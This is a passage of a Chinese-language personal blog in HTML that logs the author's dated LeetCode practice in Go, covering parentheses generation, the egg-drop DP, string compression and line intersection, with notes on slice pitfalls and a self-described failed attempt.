&#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>] + <span class="number">1</span>, top[<span class="number">1</span>]&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>], top[<span class="number">1</span>]<span class="number">-1</span>, m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>], top[<span class="number">1</span>] - <span class="number">1</span>&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> judge(top[<span class="number">0</span>], top[<span class="number">1</span>]+<span class="number">1</span>, m, n, k, visit) &#123;</span><br><span class="line">			temp = []<span class="keyword">int</span>&#123;top[<span class="number">0</span>], top[<span class="number">1</span>] + <span class="number">1</span>&#125;</span><br><span class="line">			queue = <span class="built_in">append</span>(queue, temp)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(movingCount(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-9"><a href="#2020-4-9" class="headerlink" title="2020/4/9"></a>2020/4/9</h3><h4 id="leetcode-22-括号生成-Go"><a href="#leetcode-22-括号生成-Go" class="headerlink" title="leetcode 22. 括号生成_Go"></a>leetcode 22. 括号生成_Go</h4><p>这题我是用暴力做的</p>
<p>但引出了切片作为函数参数这个大坑，资料:<a href="https://www.jianshu.com/p/7439e7ae3c4c">https://www.jianshu.com/p/7439e7ae3c4c</a></p>
<p>从输出可以看出，当slice传递给函数的时候，新建了切片s。在函数中给s进行了append一个元素，由于此时s的容量足够到，并没有生成新的底层数组。当修改返回的ret的时候，ret也共用了底层的数组，因此修改ret的原始，相应的也看到了slice的改变。</p>
<p>append 操作</p>
<p>如果在函数内，append操作超过了原始切片的容量，将会有一个新建底层数组的过程，那么此时再修改函数返回切片，应该不会再影响原始切片</p>
<p>也就是说不在共享一个底层数组，那么即使是全局变量也无法修改了，大坑！！！</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 先用暴力算法写</span></span><br><span class="line"><span class="comment">// 要是这题的思路弄清楚，我觉得递归就入门了，学习一下</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateParenthesis</span><span class="params">(n <span class="keyword">int</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> current <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">var</span> result = []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">	generateAll(&amp;current, n*<span class="number">2</span>, &amp;result)</span><br><span class="line">	<span class="comment">//fmt.Println(result)</span></span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateAll</span><span class="params">(current *<span class="keyword">string</span>, n <span class="keyword">int</span>, result *[]<span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> n == <span class="built_in">len</span>(*current) &#123;</span><br><span class="line">		<span class="keyword">if</span> valid(*current) &#123;</span><br><span class="line">			*result = <span class="built_in">append</span>(*result, *current)</span><br><span class="line">			<span class="comment">//fmt.Println(result)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	*current += <span class="string">&quot;(&quot;</span></span><br><span class="line">	generateAll(current, n, result)</span><br><span class="line">	*current = (*current)[:<span class="built_in">len</span>(*current)<span class="number">-1</span>]</span><br><span class="line">	*current += <span class="string">&quot;)&quot;</span></span><br><span class="line">	generateAll(current, n, result)</span><br><span class="line">	*current = (*current)[:<span class="built_in">len</span>(*current)<span class="number">-1</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">valid</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	balance := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(str); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">string</span>(str[i]) == <span class="string">&quot;(&quot;</span> &#123;</span><br><span class="line">			balance++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			balance--</span><br><span class="line">			<span class="keyword">if</span> balance &lt; <span class="number">0</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> balance == <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ans := generateParenthesis(<span class="number">3</span>)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 回溯法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateParenthesis</span><span class="params">(n <span class="keyword">int</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> current <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">var</span> result = []<span class="keyword">string</span>&#123;&#125;</span><br><span class="line">	generateAll(&amp;current, n, &amp;result, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="comment">//fmt.Println(result)</span></span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateAll</span><span class="params">(current *<span class="keyword">string</span>, n <span class="keyword">int</span>, result *[]<span class="keyword">string</span>, open <span class="keyword">int</span>, <span class="built_in">close</span> <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(*current) == <span class="number">2</span>*n &#123;</span><br><span class="line">		*result = <span class="built_in">append</span>(*result, *current)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> open &lt; n &#123;</span><br><span class="line">		*current += <span class="string">&quot;(&quot;</span></span><br><span class="line">		generateAll(current, n, result, open+<span class="number">1</span>, <span class="built_in">close</span>)</span><br><span class="line">		*current = (*current)[:<span class="built_in">len</span>(*current)<span class="number">-1</span>]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">close</span> &lt; open &#123;</span><br><span class="line">		*current += <span class="string">&quot;)&quot;</span></span><br><span class="line">		generateAll(current, n, result, open, <span class="built_in">close</span>+<span class="number">1</span>)</span><br><span class="line">		*current = (*current)[:<span class="built_in">len</span>(*current)<span class="number">-1</span>]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ans := generateParenthesis(<span class="number">3</span>)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用了回溯时间快了两倍，剪枝还是重要的</p>
<h3 id="2020-4-10"><a href="#2020-4-10" class="headerlink" title="2020/4/10"></a>2020/4/10</h3><h4 id="leetcode-151-翻转字符串里的单词-Go"><a href="#leetcode-151-翻转字符串里的单词-Go" class="headerlink" title="leetcode 151.翻转字符串里的单词_Go"></a>leetcode 151.翻转字符串里的单词_Go</h4><p>这题用相关api做起来是很快的，既然可以直接写，用双端队列我觉得就有点得不偿失了，毕竟go中要用stack需要自己写</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;unicode&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reverseWords</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> ans <span class="keyword">string</span></span><br><span class="line">	slice := strings.FieldsFunc(s, unicode.IsSpace)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="built_in">len</span>(slice) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">		ans += slice[i]</span><br><span class="line">		<span class="keyword">if</span> i &gt; <span class="number">0</span> &#123;</span><br><span class="line">			ans += <span class="string">&quot; &quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ans := <span class="string">&quot;the sky is blue&quot;</span></span><br><span class="line">	fmt.Println(reverseWords(ans))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="leetcode-面试题-01-06-字符串压缩-Go"><a href="#leetcode-面试题-01-06-字符串压缩-Go" class="headerlink" title="leetcode 面试题 01.06. 字符串压缩_Go"></a>leetcode 面试题 01.06. 字符串压缩_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 掌握到了一个int转换成string的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">compressString</span><span class="params">(S <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(S) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> ans <span class="keyword">string</span></span><br><span class="line">	temp := S[<span class="number">0</span>]</span><br><span class="line">	count := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(S); i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> S[i] != temp &#123;</span><br><span class="line">			ans += (<span class="keyword">string</span>(temp) + strconv.Itoa(count))</span><br><span class="line">			temp = S[i]</span><br><span class="line">			count = <span class="number">1</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			count++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans += (<span class="keyword">string</span>(temp) + strconv.Itoa(count))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(ans) &gt;= <span class="built_in">len</span>(S) &#123;</span><br><span class="line">		ans = S</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	ans := <span class="string">&quot;aabcccccaaa&quot;</span></span><br><span class="line">	fmt.Println(compressString(ans))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-11"><a href="#2020-4-11" class="headerlink" title="2020/4/11"></a>2020/4/11</h3><h4 id="leetcode-887-鸡蛋掉落-Go"><a href="#leetcode-887-鸡蛋掉落-Go" class="headerlink" title="leetcode 887.鸡蛋掉落_Go"></a>leetcode 887.鸡蛋掉落_Go</h4><p>说实话有点懵，就当学习dp了，之前看过dp，但也不至于这么难想公式</p>
<p>首先，第一步，直接阅读题解</p>
<p>第二步，解法一有二分，哦，想法一样</p>
<p>第三步，嗯？咋是这么写的，那没事了，我不会</p>
<p>这个视频讲的蛮好的：<a href="https://www.bilibili.com/video/BV1CJ411s7ud?from=search&amp;seid=18159411945702423360">https://www.bilibili.com/video/BV1CJ411s7ud?from=search&amp;seid=18159411945702423360</a></p>
<p>毕竟就算了解了dp怎么推到代码这个阶段水平要求还是高的</p>
<p>只用了DP的思路，超时的答案如下，还是很清晰易懂的</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt;= b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">superEggDrop</span><span class="params">(K <span class="keyword">int</span>, N <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="comment">// init dp array</span></span><br><span class="line">	DP := [<span class="number">101</span>][<span class="number">10001</span>]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= K; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt;= N; j++ &#123;</span><br><span class="line">			DP[i][j] = math.MaxInt32</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= N; i++ &#123;</span><br><span class="line">		DP[<span class="number">0</span>][i] = <span class="number">0</span></span><br><span class="line">		DP[<span class="number">1</span>][i] = i</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= K; i++ &#123;</span><br><span class="line">		DP[i][<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k := <span class="number">2</span>; k &lt;= K; k++ &#123;</span><br><span class="line">		<span class="keyword">for</span> n := <span class="number">1</span>; n &lt;= N; n++ &#123;</span><br><span class="line">			<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= n; i++ &#123;</span><br><span class="line">				DP[k][n] = min(DP[k][n], max(DP[k<span class="number">-1</span>][i<span class="number">-1</span>], DP[k][n-i])+<span class="number">1</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DP[K][N]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(superEggDrop(<span class="number">3</span>, <span class="number">14</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>尝试一下优化</p>
<p>这里用到了题解中的单调性，真厉害啊，在第五层</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &gt;= b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">min</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> a &lt; b &#123;</span><br><span class="line">		<span class="keyword">return</span> a</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">superEggDrop</span><span class="params">(K <span class="keyword">int</span>, N <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="comment">// init dp array</span></span><br><span class="line">	DP := [<span class="number">101</span>][<span class="number">10001</span>]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= K; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt;= N; j++ &#123;</span><br><span class="line">			DP[i][j] = math.MaxInt32</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= N; i++ &#123;</span><br><span class="line">		DP[<span class="number">0</span>][i] = <span class="number">0</span></span><br><span class="line">		DP[<span class="number">1</span>][i] = i</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= K; i++ &#123;</span><br><span class="line">		DP[i][<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k := <span class="number">2</span>; k &lt;= K; k++ &#123;</span><br><span class="line">		<span class="keyword">for</span> n := <span class="number">1</span>; n &lt;= N; n++ &#123;</span><br><span class="line">			<span class="comment">// for i := 1; i &lt;= n; i++ &#123;</span></span><br><span class="line">			<span class="comment">// 	DP[k][n] = min(DP[k][n], max(DP[k-1][i-1], DP[k][n-i])+1)</span></span><br><span class="line">			<span class="comment">// &#125;</span></span><br><span class="line">			<span class="comment">// 二分搜索</span></span><br><span class="line">			low, high := <span class="number">1</span>, n</span><br><span class="line">			m := <span class="number">0</span></span><br><span class="line">			<span class="keyword">for</span> low &lt;= high &#123;</span><br><span class="line">				m = (high-low)/<span class="number">2</span> + low</span><br><span class="line">				x, y := DP[k<span class="number">-1</span>][m<span class="number">-1</span>], DP[k][n-m]</span><br><span class="line">				<span class="keyword">if</span> x &gt; y &#123;</span><br><span class="line">					high = m - <span class="number">1</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					low = m + <span class="number">1</span></span><br><span class="line">				&#125;</span><br><span class="line">				DP[k][n] = min(DP[k][n], max(x, y)+<span class="number">1</span>)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DP[K][N]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(superEggDrop(<span class="number">3</span>, <span class="number">14</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>终于搞定了，对dp的理解又加深了</p>
<h3 id="2020-4-12"><a href="#2020-4-12" class="headerlink" title="2020/4/12"></a>2020/4/12</h3><h4 id="leetcode-面试题-16-03-交点-Go"><a href="#leetcode-面试题-16-03-交点-Go" class="headerlink" title="leetcode 面试题 16.03. 交点_Go"></a>leetcode 面试题 16.03. 交点_Go</h4><p>因为精度问题失败了</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这题完全不会，几何学一般性的面试也不会考吧，图像和游戏？</span></span><br><span class="line"><span class="comment">// 单纯因为好奇怎么做才看着题解学习了一下，这题其实感觉没什么必要</span></span><br><span class="line"><span class="comment">// 然后看到一堆数学直接放弃</span></span><br><span class="line"><span class="comment">// 只能用分类讨论了，还好昨天练了一下dp，今天用上了，怀疑官方就是这么考虑才出的题</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intersection</span><span class="params">(start1 []<span class="keyword">int</span>, end1 []<span class="keyword">int</span>, start2 []<span class="keyword">int</span>, end2 []<span class="keyword">int</span>)</span> []<span class="title">float64</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> start1[<span class="number">0</span>] &gt; end1[<span class="number">0</span>] &#123;</span><br><span class="line">		start1, end1 = end1, start1</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> start2[<span class="number">0</span>] &gt; end2[<span class="number">0</span>] &#123;</span><br><span class="line">		start2, end2 = end2, start2</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 两条垂直线</span></span><br><span class="line">	<span class="keyword">if</span> start1[<span class="number">0</span>] == end1[<span class="number">0</span>] &amp;&amp; start2[<span class="number">0</span>] == end2[<span class="number">0</span>] &#123;</span><br><span class="line">		<span class="keyword">if</span> start1[<span class="number">1</span>] &gt; end1[<span class="number">1</span>] &#123;</span><br><span class="line">			start1, end1 = end1, start1</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> start2[<span class="number">1</span>] &gt; end2[<span class="number">1</span>] &#123;</span><br><span class="line">			start2, end2 = end2, start2</span><br><span class="line">		&#125;</span><br><span class="line">		ans := twoVertical(start1, end1, start2, end2)</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> start1[<span class="number">0</span>] == end1[<span class="number">0</span>] &#123; <span class="comment">// 一条垂线</span></span><br><span class="line">		<span class="keyword">if</span> start1[<span class="number">1</span>] &gt; end1[<span class="number">1</span>] &#123;</span><br><span class="line">			start1, end1 = end1, start1</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> oneVertical(start1, end1, start2, end2)</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> start2[<span class="number">0</span>] == end2[<span class="number">0</span>] &#123;</span><br><span class="line">		<span class="keyword">if</span> start2[<span class="number">1</span>] &gt; end2[<span class="number">1</span>] &#123;</span><br><span class="line">			start2, end2 = end2, start2</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> oneVertical(start2, end2, start1, end1)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 无垂直线</span></span><br><span class="line">	<span class="keyword">return</span> noVertical(start1, end1, start2, end2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">twoVertical</span><span class="params">(start1 []<span class="keyword">int</span>, end1 []<span class="keyword">int</span>, start2 []<span class="keyword">int</span>, end2 []<span class="keyword">int</span>)</span> []<span class="title">float64</span></span> &#123;</span><br><span class="line">	ans := []<span class="keyword">float64</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> start1[<span class="number">0</span>] != start2[<span class="number">0</span>] &#123;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	low, high := math.Max(<span class="keyword">float64</span>(start1[<span class="number">1</span>]), <span class="keyword">float64</span>(start2[<span class="number">1</span>])), math.Min(<span class="keyword">float64</span>(end1[<span class="number">1</span>]), <span class="keyword">float64</span>(end2[<span class="number">1</span>]))</span><br><span class="line">	<span class="keyword">if</span> low &lt;= high &#123;</span><br><span class="line">		ans = []<span class="keyword">float64</span>&#123;<span class="keyword">float64</span>(start1[<span class="number">0</span>]), low&#125;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">oneVertical</span><span class="params">(start1 []<span class="keyword">int</span>, end1 []<span class="keyword">int</span>, start2 []<span class="keyword">int</span>, end2 []<span class="keyword">int</span>)</span> []<span class="title">float64</span></span> &#123;</span><br><span class="line">	ans := []<span class="keyword">float64</span>&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> start1[<span class="number">0</span>] &lt; start2[<span class="number">0</span>] || start1[<span class="number">0</span>] &gt; end2[<span class="number">0</span>] &#123;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	y := calY(start2, end2, start1[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">if</span> y &gt;= start1[<span class="number">1</span>] &amp;&amp; y &lt;= end1[<span class="number">1</span>] &#123;</span><br><span class="line">		ans = []<span class="keyword">float64</span>&#123;<span class="keyword">float64</span>(start1[<span class="number">0</span>]), <span class="keyword">float64</span>(y)&#125;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">noVertical</span><span class="params">(start1 []<span class="keyword">int</span>, end1 []<span class="keyword">int</span>, start2 []<span class="keyword">int</span>, end2 []<span class="keyword">int</span>)</span> []<span class="title">float64</span></span> &#123;</span><br><span class="line">	ans := []<span class="keyword">float64</span>&#123;&#125;</span><br><span class="line">	interX1, interX2 := math.Max(<span class="keyword">float64</span>(start1[<span class="number">0</span>]), <span class="keyword">float64</span>(start2[<span class="number">0</span>])), math.Min(<span class="keyword">float64</span>(end1[<span class="number">0</span>]), <span class="keyword">float64</span>(end2[<span class="number">0</span>]))</span><br><span class="line">	<span class="keyword">if</span> interX1 &gt; interX2 &#123;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	left, right := interX1, interX2</span><br><span class="line">	interY1Left := calY(start1, end1, <span class="keyword">int</span>(left))</span><br><span class="line">	interY2Left := calY(start2, end2, <span class="keyword">int</span>(left))</span><br><span class="line">	interY1Right := calY(start1, end1, <span class="keyword">int</span>(right))</span><br><span class="line">	interY2Right := calY(start2, end2, <span class="keyword">int</span>(right))</span><br><span class="line">	<span class="keyword">if</span> interY1Left == interY2Left &#123;</span><br><span class="line">		ans = []<span class="keyword">float64</span>&#123;left, <span class="keyword">float64</span>(interY1Left)&#125;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> interY1Right == interY2Right &#123;</span><br><span class="line">		ans = []<span class="keyword">float64</span>&#123;right, <span class="keyword">float64</span>(interY2Right)&#125;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (interY1Left-interY2Left)*(interY1Right-interY2Right) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> ans</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 二分，精度为给定的10^(-6)</span></span><br><span class="line">	sign := <span class="number">-1</span></span><br><span class="line">	<span class="keyword">if</span> interY1Left &gt; interY2Left &#123;</span><br><span class="line">		sign = <span class="number">1</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> right-left &gt; math.Pow10(<span class="number">-6</span>) &#123;</span><br><span class="line">		mid := (<span class="keyword">int</span>(right) + <span class="keyword">int</span>(left)) / <span class="number">2</span></span><br><span class="line">		y1 := calY(start1, end1, mid)</span><br><span class="line">		y2 := calY(start2, end2, mid)</span><br><span class="line">		<span class="keyword">if</span> y1 == y2 &#123;</span><br><span class="line">			ans = []<span class="keyword">float64</span>&#123;<span class="keyword">float64</span>(mid), <span class="keyword">float64</span>(y1)&#125;</span><br><span class="line">			<span class="keyword">return</span> ans</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (y1-y2)*sign &gt; <span class="number">0</span> &#123;</span><br><span class="line">			left = <span class="keyword">float64</span>(mid)</span><br><span class="line">		&#125;</span><br><span class="line">		right = <span class="keyword">float64</span>(mid)</span><br><span class="line">	&#125;</span><br><span class="line">	ans = []<span class="keyword">float64</span>&#123;left, right&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span 